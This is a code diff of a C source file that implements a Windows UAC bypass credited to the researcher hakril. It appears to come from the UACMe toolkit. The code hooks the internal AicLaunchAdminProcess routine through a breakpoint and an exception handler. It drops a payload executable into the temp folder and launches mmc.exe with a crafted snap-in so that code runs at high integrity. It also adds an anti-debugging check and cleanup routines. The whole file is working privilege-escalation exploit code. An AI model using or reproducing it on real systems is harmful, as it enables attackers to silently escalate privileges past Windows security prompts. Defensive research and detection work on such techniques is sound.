@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2017 - 2018
+*  (C) COPYRIGHT AUTHORS, 2017 - 2019
 *
 *  TITLE:       HAKRIL.C
 *
-*  VERSION:     2.90
+*  VERSION:     3.17
 *
-*  DATE:        10 July 2018
+*  DATE:        17 Mar 2019
 *
 *  UAC bypass method from Clement Rouault aka hakril.
 *
@@ -20,6 +20,7 @@
 
 LPWSTR g_SnapInParameters = NULL;
 pfnAipFindLaunchAdminProcess g_OriginalFunction = NULL;
+BYTE g_OriginalPrologue = 0;
 
 /*
 * AicLaunchAdminProcessHook
@@ -43,6 +44,16 @@ ULONG_PTR WINAPI AicLaunchAdminProcessHook(
 {
     UNREFERENCED_PARAMETER(lpParameters);
 
+    if (!AicSetRemoveFunctionBreakpoint(
+        g_OriginalFunction,
+        &g_OriginalPrologue,
+        sizeof(g_OriginalPrologue),
+        FALSE,
+        NULL))
+    {
+        return 0; //general fuckup.
+    }
+
     return g_OriginalFunction(lpApplicationName,
         g_SnapInParameters,
         UacRequestFlag,
@@ -52,6 +63,30 @@ ULONG_PTR WINAPI AicLaunchAdminProcessHook(
         StartupInfo,
         ProcessInfo,
         ElevationReason);
+}
+
+/*
+* AicUnhandledExceptionFilter
+*
+* Purpose:
+*
+* Exception handler for breakpoint.
+*
+*/
+LONG WINAPI AicUnhandledExceptionFilter(
+    _In_ EXCEPTION_POINTERS *ExceptionInfo
+)
+{
+    if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_BREAKPOINT) {
+#ifdef _WIN64
+        if (ExceptionInfo->ContextRecord->Rip == (DWORD64)g_OriginalFunction)
+            ExceptionInfo->ContextRecord->Rip = (DWORD64)AicLaunchAdminProcessHook;
+#else
+        if (ExceptionInfo->ContextRecord->Eip == (DWORD)g_OriginalFunction)
+            ExceptionInfo->ContextRecord->Eip = (DWORD)AicLaunchAdminProcessHook;
+#endif
+    }
+    return EXCEPTION_CONTINUE_EXECUTION;
 }
 
 /*
@@ -68,33 +103,44 @@ ULONG_PTR WINAPI AicLaunchAdminProcessHook(
 * execution of remote script on local machine with High IL.
 *
 */
-BOOL ucmHakrilMethod(
+NTSTATUS ucmHakrilMethod(
     _In_ PVOID ProxyDll,
     _In_ DWORD ProxyDllSize
 )
 {
-    BOOL bResult = FALSE, bCond = FALSE, bExtracted = FALSE;
-    ULONG DataSize = 0, SnapinSize = 0, ErrorCode = 0;
+    NTSTATUS MethodResult = STATUS_ACCESS_DENIED, StatusCode;
+
+    BOOL bExtracted = FALSE;
+    ULONG DataSize = 0, SnapinSize = 0;
     SIZE_T Dummy;
     PVOID SnapinResource = NULL, SnapinData = NULL;
-    PVOID ImageBaseAddress = NtCurrentPeb()->ImageBaseAddress;
+    PVOID ImageBaseAddress = g_hInstance;
     PVOID LaunchAdminProcessPtr = NULL;
     LPWSTR lpText;
+
+    LPTOP_LEVEL_EXCEPTION_FILTER PreviousFilter;
 
     WCHAR szBuffer[MAX_PATH * 2];
     SHELLEXECUTEINFO shinfo;
 
     do {
 
+#ifndef _DEBUG
+        if (supIsDebugPortPresent()) {
+            MethodResult = STATUS_DEBUG_ATTACH_FAILED;
+            break;
+        }
+#endif     
+
         //
         // Lookup AicLaunchAdminProcess routine pointer.
         //
-        LaunchAdminProcessPtr = (PVOID)AipFindLaunchAdminProcess(&ErrorCode);
+        LaunchAdminProcessPtr = (PVOID)AicFindLaunchAdminProcess(&StatusCode);
         if (LaunchAdminProcessPtr == NULL) {
 
-            switch (ErrorCode) {
+            switch (StatusCode) {
 
-            case ERROR_PROC_NOT_FOUND:
+            case STATUS_PROCEDURE_NOT_FOUND:
                 lpText = TEXT("The required procedure address not found.");
                 break;
 
@@ -103,7 +149,8 @@ BOOL ucmHakrilMethod(
                 break;
             }
 
-            ucmShowMessage(lpText);
+            ucmShowMessage(g_ctx->OutputToDebugger, lpText);
+            MethodResult = StatusCode;
             break;
         }
 
@@ -116,21 +163,27 @@ BOOL ucmHakrilMethod(
             &DataSize);
 
         if (SnapinResource) {
-            SnapinData = g_ctx.DecryptRoutine(SnapinResource, DataSize, &SnapinSize);
+            SnapinData = g_ctx->DecompressRoutine(KAMIKAZE_ID, SnapinResource, DataSize, &SnapinSize);
             if (SnapinData == NULL)
                 break;
         }
         else
             break;
 
-        if (!supConvertDllToExeSetNewEP(ProxyDll, ProxyDllSize, FUBUKI_DEFAULT_ENTRYPOINT))
+        if (!supReplaceDllEntryPoint(
+            ProxyDll,
+            ProxyDllSize,
+            FUBUKI_DEFAULT_ENTRYPOINT,
+            TRUE))
+        {
             break;
+        }
 
         //
         // Write Fubuki.exe to the %temp%
         //
         RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
-        _strcpy(szBuffer, g_ctx.szTempDirectory);
+        _strcpy(szBuffer, g_ctx->szTempDirectory);
         Dummy = _strlen(szBuffer);
         _strcat(szBuffer, FUBUKI_EXE);
 
@@ -159,7 +212,7 @@ BOOL ucmHakrilMethod(
         //
         // Allocate and fill snap-in parameters buffer.
         //
-        g_SnapInParameters = supHeapAlloc(0x1000);
+        g_SnapInParameters = (LPWSTR)supHeapAlloc(PAGE_SIZE);
         if (g_SnapInParameters == NULL)
             break;
 
@@ -168,53 +221,51 @@ BOOL ucmHakrilMethod(
         _strcat(g_SnapInParameters, TEXT("\""));
 
         //
-        // Setup inline hook.
+        // Setup function breakpoint.
         //
-        if (MH_Initialize() != MH_OK)
-            break;
-
-#pragma warning(push)
-#pragma warning(disable: 4054)//code to data
-        if (MH_CreateHook((LPVOID)LaunchAdminProcessPtr,
-            (LPVOID)AicLaunchAdminProcessHook,
-            (LPVOID)&g_OriginalFunction) != MH_OK)
+        g_OriginalFunction = (pfnAipFindLaunchAdminProcess)LaunchAdminProcessPtr;
+        g_OriginalPrologue = 0;
+        if (!AicSetRemoveFunctionBreakpoint(
+            g_OriginalFunction,
+            &g_OriginalPrologue,
+            sizeof(g_OriginalPrologue),
+            TRUE,
+            NULL))
         {
+            MethodResult = STATUS_BREAKPOINT;
             break;
         }
-#pragma warning(pop)
 
-        if (MH_EnableHook((LPVOID)LaunchAdminProcessPtr) != MH_OK)
-            break;
-
-        RtlSecureZeroMemory(&shinfo, sizeof(shinfo));
+        PreviousFilter = SetUnhandledExceptionFilter(
+            (LPTOP_LEVEL_EXCEPTION_FILTER)AicUnhandledExceptionFilter);
 
         //
         // Run trigger application.
         //
+        RtlSecureZeroMemory(&shinfo, sizeof(shinfo));
         shinfo.cbSize = sizeof(shinfo);
         shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
         shinfo.lpFile = MMC_EXE;
         shinfo.lpParameters = g_SnapInParameters;
         shinfo.lpVerb = RUNAS_VERB;
         shinfo.nShow = SW_SHOW;
-        bResult = ShellExecuteEx(&shinfo);
-        if (bResult) {
+        if (ShellExecuteEx(&shinfo)) {
             if (WaitForSingleObject(shinfo.hProcess, 0x4e20) == WAIT_TIMEOUT)
                 TerminateProcess(shinfo.hProcess, (UINT)-1);
             CloseHandle(shinfo.hProcess);
+            MethodResult = STATUS_SUCCESS;
         }
 
-    } while (bCond);
+        SetUnhandledExceptionFilter(PreviousFilter);
+
+    } while (FALSE);
 
     //
     // Cleanup.
     //
-    MH_Uninitialize();
-
     if (SnapinData) {
         RtlSecureZeroMemory(SnapinData, SnapinSize);
-        Dummy = 0;
-        NtFreeVirtualMemory(NtCurrentProcess(), &SnapinData, &Dummy, MEM_RELEASE);
+        supVirtualFree(SnapinData, NULL);
     }
 
     if (g_SnapInParameters) {
@@ -226,10 +277,30 @@ BOOL ucmHakrilMethod(
     // Remove our msc file. Fubuki should be removed by payload code itself as it will be locked on execution.
     //
     if (bExtracted) {
-        _strcpy(szBuffer, g_ctx.szTempDirectory);
+        _strcpy(szBuffer, g_ctx->szTempDirectory);
         _strcat(szBuffer, KAMIKAZE_MSC);
         DeleteFile(szBuffer);
     }
 
-    return bResult;
+    return MethodResult;
+}
+
+/*
+* ucmHakrilMethodCleanup
+*
+* Purpose:
+*
+* Post execution cleanup routine for HakrilMethod
+*
+*/
+BOOL ucmHakrilMethodCleanup(
+    VOID
+)
+{
+    WCHAR szBuffer[MAX_PATH * 2];
+
+    _strcpy(szBuffer, g_ctx->szTempDirectory);
+    _strcat(szBuffer, FUBUKI_EXE);
+
+    return DeleteFile(szBuffer);
 }
